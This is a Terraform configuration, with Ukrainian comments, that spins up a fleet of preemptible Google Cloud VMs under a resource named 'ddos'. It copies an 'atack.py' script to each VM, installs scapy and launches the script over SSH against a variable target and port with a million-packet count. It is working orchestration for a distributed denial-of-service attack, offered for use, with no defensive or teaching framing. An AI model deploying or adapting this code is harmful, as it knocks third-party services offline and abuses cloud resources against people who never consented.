provider "google" {
  region = "europe-west2" # залишіть даний регіон або оберіть інший з
  project = "" # введіть ім'я проєкта що створили
  credentials = "" # повний шлях до завантаженого сервіс-акаунту
}

data "google_compute_zones" "available" {}

resource "random_shuffle" "az" {
  count = var.kozaks
  input        = data.google_compute_zones.available.names
  result_count = 1
}


resource "google_compute_instance" "ddos" {
  count = var.kozaks
  zone = random_shuffle.az[count.index].result[0]
  name         = "kozak-${count.index}"
  machine_type = "n1-highcpu-4"

  scheduling {
    preemptible = true
    automatic_restart = false
  }

  boot_disk {
    initialize_params {
      image = "ubuntu-os-cloud/ubuntu-minimal-2004-lts"
    }
  }

  network_interface {
    network = "default"
    subnetwork = "default"

    access_config {
      // Ephemeral public IP
    }
  }

  metadata = {
    ssh-keys = "ubuntu:${tls_private_key.kozak.public_key_openssh}"
  }

  provisioner "file" {
    source      = "${abspath(path.root)}/../atack.py"
    destination = "/tmp/atack.py"
  }
  connection {
    type        = "ssh"
    host        = self.network_interface.0.access_config.0.nat_ip
    user        = "ubuntu"
    private_key = tls_private_key.kozak.private_key_pem
  }
  provisioner "remote-exec" {
    inline = [
        "sudo apt update",
        "sudo apt install -y screen python3-scapy", # Don't forget screen !!!!
    ]
  }
}

resource "null_resource" "atack_py" {
  count = length(google_compute_instance.ddos)
  triggers = {
     hostname = google_compute_instance.ddos[count.index].network_interface.0.access_config.0.nat_ip
  }
  provisioner "local-exec" {
    command = "ssh -oStrictHostKeyChecking=no -i ${abspath(path.root)}/kozak_rsa -f ubuntu@${google_compute_instance.ddos[count.index].network_interface.0.access_config.0.nat_ip} 'screen -d -m sudo python3 /tmp/atack.py -t ${var.goal_atack}  -p ${var.port_atack} -c 1000000'"
  }
}
